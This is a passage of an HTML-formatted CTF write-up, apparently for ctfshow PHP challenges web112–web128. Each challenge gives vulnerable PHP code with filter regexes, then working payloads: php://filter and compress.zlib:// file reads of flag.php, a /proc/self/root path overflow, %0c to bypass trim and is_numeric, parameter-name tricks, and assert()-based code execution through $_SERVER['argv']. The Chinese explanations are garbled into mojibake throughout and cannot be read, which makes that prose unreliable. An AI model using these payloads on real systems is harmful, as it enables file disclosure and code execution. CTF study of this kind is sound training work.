null</li><li>è¦æƒ³è·¨è¿‡è¯æ³•ä½œç”¨åŸŸçš„é™åˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ GLOBALS å¸¸é‡æ•°ç»„ï¼Œå…¶ä¸­åŒ…å«äº† $flag é”®å€¼å¯¹ï¼Œå°±å¯ä»¥å°† $flag çš„å€¼èµ‹ç»™ $$v1</li></ol><p>Payloadï¼š<code>?v1=ctfshow&amp;v2=GLOBALS</code></p><h4 id="web112-is-file"><a href="#web112-is-file" class="headerlink" title="web112(is_file)"></a>web112(is_file)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\.\.\/|http|https|data|input|rot13|base64|string/i'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </code></pre><p>è¦æ±‚ä¼ å…¥çš„fileä¸æ˜¯æ–‡ä»¶ï¼Œä½†è¿˜èƒ½highlight_fileï¼Œè¿™å°±è¦è¯´æ˜is_fileå’Œhighlight_fileå¯¹äºæ–‡ä»¶çš„åˆ¤æ–­ï¼šis_fileè®¤ä¸ºä¼ªåè®®ä¸æ˜¯æ–‡ä»¶ï¼Œhighlight_fileè®¤ä¸ºä¼ªåè®®æ˜¯æ–‡ä»¶ï¼Œæ‰€ä»¥è¿™é‡Œä¼ å…¥filterä¼ªåè®®å³å¯ã€‚</p><p>Payload:</p><blockquote><p>php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php<br>php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UCS-2LE.UCS-2BE&#x2F;resource&#x3D;flag.php<br>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.quoted-printable-encode&#x2F;resource&#x3D;flag.php<br>compress.zlib:&#x2F;&#x2F;flag.php</p></blockquote><p><a href="https://www.novel.tools/decode/UCS-2BE">UCS-2BE Text Decoder</a></p><h4 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/filter|\.\.\/|http|https|data|data|rot13|base64|string/i'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>1.åˆ©ç”¨å‡½æ•°æ‰€èƒ½å¤„ç†çš„é•¿åº¦é™åˆ¶è¿›è¡Œç›®å½•æº¢å‡ºï¼š åŸç†ï¼š&#x2F;proc&#x2F;self&#x2F;rootä»£è¡¨æ ¹ç›®å½•ï¼Œè¿›è¡Œç›®å½•æº¢å‡ºï¼Œè¶…è¿‡is_fileèƒ½å¤„ç†çš„æœ€å¤§é•¿åº¦å°±ä¸è®¤ä¸ºæ˜¯ä¸ªæ–‡ä»¶äº†ã€‚ payload: <code>file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p roc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro c/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/ self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se lf/root/proc/self/root/var/www/html/flag.php</code></p><p>2.åˆ©ç”¨phpä¸­zipä¼ªåè®® ç”¨æ³•[æºäºphpå®˜æ–¹æä¾›çš„ä¸€äº›ä¾‹å­]ï¼š compress.zlib:&#x2F;&#x2F;file.gz compress.zlib:&#x2F;&#x2F;file.bz2 payload: <code>file=compress.zlib://flag.php</code></p><h4 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"å¸ˆå‚…ä»¬å±…ç„¶tqléƒ½æ˜¯éé¢„æœŸ å“¼ï¼"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>æŠŠfilteræ”¾å‡ºæ¥äº†ï¼Œç›´æ¥è¯»</p><h4 id="web115-fç»•è¿‡is-numberic-trim"><a href="#web115-fç»•è¿‡is-numberic-trim" class="headerlink" title="web115(\fç»•è¿‡is_numberic()+trim())"></a>web115(\fç»•è¿‡is_numberic()+trim())</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0x"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"e"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"+"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$num</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$num</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$num</span><span class="token operator">!==</span><span class="token string single-quoted-string">'36'</span> <span class="token keyword">and</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token string single-quoted-string">'36'</span> <span class="token keyword">and</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string single-quoted-string">'36'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">==</span><span class="token string single-quoted-string">'36'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!!!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><strong>trim()</strong> å‡½æ•°ç§»é™¤å­—ç¬¦ä¸²ä¸¤ä¾§çš„ç©ºç™½å­—ç¬¦æˆ–å…¶ä»–é¢„å®šä¹‰å­—ç¬¦ã€‚</p><p>ä¸€èˆ¬æ˜¯ç”¨æ¥å»é™¤å­—ç¬¦ä¸²é¦–å°¾å¤„çš„ç©ºç™½å­—ç¬¦ï¼ˆæˆ–è€…å…¶ä»–å­—ç¬¦ï¼‰ï¼Œä¸€èˆ¬åœ¨ç”¨åœ¨æœåŠ¡ç«¯å¯¹æ¥æ”¶çš„ç”¨æˆ·æ•°æ®è¿›è¡Œå¤„ç†ï¼Œä»¥å…æŠŠç”¨æˆ·è¯¯è¾“å…¥çš„ç©ºæ ¼å­˜å‚¨åˆ°æ•°æ®åº“ï¼Œä¸‹æ¬¡å¯¹æ¯”æ•°æ®æ—¶å€™å‡ºé”™ã€‚</p><p>filterè®©æˆ‘ä»¬æ²¡æ³•è½¬è¿›åˆ¶ç»•è¿‡ï¼Œè¿™é“é¢˜çš„å…³é”®åœ¨äºå¦‚ä½•ç»•è¿‡trimï¼Œæ¨æµ‹éœ€è¦ç‰¹æ®Šå­—ç¬¦ï¼Œæ‰€ä»¥æˆ‘ä»¬å†™ä¸ªè„šæœ¬fuzzä¸€ä¸‹ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0x"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"e"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"+"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$num</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">129</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'36'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$num</span><span class="token operator">!==</span><span class="token string single-quoted-string">'36'</span> <span class="token keyword">and</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token string single-quoted-string">'36'</span> <span class="token keyword">and</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string single-quoted-string">'36'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span></span></code></pre><p>Payload:<code>?num=%0c36</code></p><p>trimå‡½æ•°ä¼šè¿‡æ»¤ç©ºæ ¼ä»¥åŠ<code>\n\r\t\v\0</code>ï¼Œä½†ä¸ä¼šè¿‡æ»¤<code>\f</code></p><h4 id="web123-ä¸‹åˆ’çº¿-ç»•è¿‡"><a href="#web123-ä¸‹åˆ’çº¿-ç»•è¿‡" class="headerlink" title="web123(ä¸‹åˆ’çº¿_ç»•è¿‡)"></a>web123(ä¸‹åˆ’çº¿_ç»•è¿‡)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'argv'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fun'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW.COM'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fl0g'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\"|\'|\,|\.|\;|\?/"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token variable">$c</span><span class="token operator">&lt;=</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$c</span></span>"</span><span class="token operator">.</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$fl0g</span><span class="token operator">===</span><span class="token string double-quoted-string">"flag_give_me"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>             <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> </code></pre><p>åœ¨phpä¸­å˜é‡ååªæœ‰æ•°å­—å­—æ¯ä¸‹åˆ’çº¿ï¼Œè¢«getæˆ–è€…postä¼ å…¥çš„å˜é‡åï¼Œå¦‚æœå«æœ‰ç©ºæ ¼ã€+ã€[åˆ™ä¼šè¢«è½¬åŒ–ä¸º<code>_</code>ï¼Œæ‰€ä»¥æŒ‰ç†æ¥è¯´æˆ‘ä»¬æ„é€ ä¸å‡ºCTF_SHOW.COMè¿™ä¸ªå˜é‡(å› ä¸ºå«æœ‰.)ï¼Œä½†phpä¸­æœ‰ä¸ªç‰¹æ€§å°±æ˜¯å¦‚æœä¼ å…¥[ï¼Œå®ƒè¢«è½¬åŒ–ä¸º<code>_</code>ä¹‹åï¼Œåé¢çš„å­—ç¬¦å°±ä¼šè¢«ä¿ç•™ä¸‹æ¥ä¸ä¼šè¢«æ›¿æ¢</p><p>Payload:<code>CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=echo $flag</code></p><h4 id="web125-SERVER-â€˜argvâ€™-ç»•è¿‡"><a href="#web125-SERVER-â€˜argvâ€™-ç»•è¿‡" class="headerlink" title="web125($_SERVER[â€˜argvâ€™]ç»•è¿‡)"></a>web125($_SERVER[â€˜argvâ€™]ç»•è¿‡)</h4><p>åˆ©ç”¨$_SERVER[â€˜argvâ€™]</p><blockquote><p>parse_str(ï¼‰å‡½æ•°æŠŠæŸ¥è¯¢å­—ç¬¦ä¸²è§£æåˆ°å˜é‡ä¸­ã€‚<br>æ³¨é‡Šï¼šå¦‚æœæœªè®¾ç½®arrayå‚æ•°ï¼Œåˆ™ç”±è¯¥å‡½æ•°è®¾ç½®çš„å˜é‡å°†è¦†ç›–å·²å­˜åœ¨çš„åŒåå˜é‡ã€‚<br>æ³¨é‡Šï¼šphp.ini æ–‡ä»¶ä¸­çš„ magic_quotes_gpc è®¾ç½®å½±å“è¯¥å‡½æ•°çš„è¾“å‡ºã€‚å¦‚æœå·²å¯ç”¨ï¼Œé‚£ä¹ˆåœ¨ parse_strOï¼‰è§£æä¹‹å‰ï¼Œå˜é‡ä¼šè¢« addslashesOè½¬æ¢ã€‚</p></blockquote><p>$_SERVER æ˜¯ä¸€ä¸ªåŒ…å«äº†è¯¸å¦‚å¤´ä¿¡æ¯(header)ã€è·¯å¾„(path)ã€ä»¥åŠè„šæœ¬ä½ç½®(script locations)ç­‰ç­‰ä¿¡æ¯çš„æ•°ç»„ã€‚è¿™ä¸ªæ•°ç»„ä¸­çš„é¡¹ç›®ç”± Web æœåŠ¡å™¨åˆ›å»ºã€‚</p><p>â€˜argvâ€™</p><p>ä¼ é€’ç»™è¯¥è„šæœ¬çš„å‚æ•°çš„æ•°ç»„ã€‚å½“è„šæœ¬ä»¥å‘½ä»¤è¡Œæ–¹å¼è¿è¡Œæ—¶ï¼Œargv å˜é‡ä¼ é€’ç»™ç¨‹åº C è¯­è¨€æ ·å¼çš„å‘½ä»¤è¡Œå‚æ•°ã€‚å½“é€šè¿‡ GET æ–¹å¼è°ƒç”¨æ—¶ï¼Œè¯¥å˜é‡åŒ…å«query stringã€‚</p><p>æ„æ€å°±æ˜¯é€šè¿‡$_SERVER[â€˜argvâ€™]å°†$aå˜æˆæ•°ç»„ï¼Œå†åˆ©ç”¨æ•°ç»„çš„æ€§è´¨å°†fl0g&#x3D;flag_give_meä¼ å…¥ï¼ŒåŒæ—¶è¿˜ç»•è¿‡ç¬¬ä¸€ä¸ªifä¸­çš„!isset($_GET[â€˜fl0gâ€™]))ï¼Œç”¨+æ¥è¿›è¡Œåˆ†éš”ï¼Œä½¿å¾—æ•°ç»„ä¸­æœ‰å¤šä¸ªæ•°å€¼ã€‚</p><p>æ‰§è¡Œevalå‡½æ•°ä¹Ÿå°±æ˜¯æ‰§è¡Œ$cå³æ˜¯parse_str($a[1])ï¼Œä½¿å¾—fl0g&#x3D;flag_give_meï¼Œä»è€Œè¿›å…¥ç¬¬ä¸‰ä¸ªifè¯­å¥ã€‚</p><p>Payload:</p><blockquote><p>GET:?1&#x3D;flag.php </p><p>POST:CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;highlight_file($_GET[1])</p><p>GET:?a&#x3D;1++fl0g&#x3D;flag_give_me</p><p>POST:CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;parse_str($a[1])</p><p>GET:?a&#x3D;1++fl0g&#x3D;flag_give_me</p><p>POST:CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;assert($a[0])</p></blockquote><h4 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h4><p>PayloadåŒä¸Š</p><h4 id="web127-extractå˜é‡è¦†ç›–-SERVER-â€˜QUERY-STRINGâ€™"><a href="#web127-extractå˜é‡è¦†ç›–-SERVER-â€˜QUERY-STRINGâ€™" class="headerlink" title="web127(extractå˜é‡è¦†ç›– $_SERVER[â€˜QUERY_STRINGâ€™])"></a>web127(extractå˜é‡è¦†ç›– $_SERVER[â€˜QUERY_STRINGâ€™])</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ctf_show</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//ç‰¹æ®Šå­—ç¬¦æ£€æµ‹</span><span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\'|\"|\&lt;|\,|\>|\.|\\\|\//'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"å—¯å“¼ï¼Ÿ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ctf_show</span><span class="token operator">===</span><span class="token string single-quoted-string">'ilove36d'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p><strong>extract()</strong> å‡½æ•°ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ã€‚</p><p><code>.</code>å’Œ<code>[</code>è¢«è¿‡æ»¤äº†å¯ä»¥ä½¿ç”¨<code> </code>(ç©ºæ ¼)æ¥è¿‡æ»¤</p><p>**$SERVER[â€˜QUERY_STRINGâ€™];**è·å–çš„æŸ¥è¯¢è¯­å¥æ˜¯æœåŠ¡ç«¯è¿˜æ²¡urlè§£ç ä¹‹å‰çš„å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥å¯¹<code>_</code>è¿›è¡Œä¸€æ¬¡urlç¼–ç ä¹Ÿèƒ½ç»•è¿‡ã€‚</p><p>Payload:<code>?ctf%5fshow=ilove36d</code></p><h4 id="web128-gettext"><a href="#web128-gettext" class="headerlink" title="web128(gettext-&gt;_())"></a>web128(gettext-&gt;_())</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token 